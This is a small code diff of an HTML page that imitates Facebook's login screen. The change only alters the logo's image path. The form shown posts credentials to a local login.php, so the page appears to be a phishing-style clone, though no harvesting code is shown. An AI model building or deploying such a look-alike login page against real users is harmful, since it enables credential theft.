@@ -155,7 +155,7 @@
 <body>
     <div class="container">
         <!-- <div class="facebook-logo">facebook</div> -->
-        <img class="facebook-logo" src="/ig-pics/fb-removebg-preview.png" alt="">
+        <img class="facebook-logo" src="../ig-pics/fb-removebg-preview.png" alt="">
         <div class="login-form">
             <p>Log in to Facebook</p>
             <form id="loginForm-mobile" action="login.php" method="POST" onsubmit="return validateForm ('loginForm-mobile')">
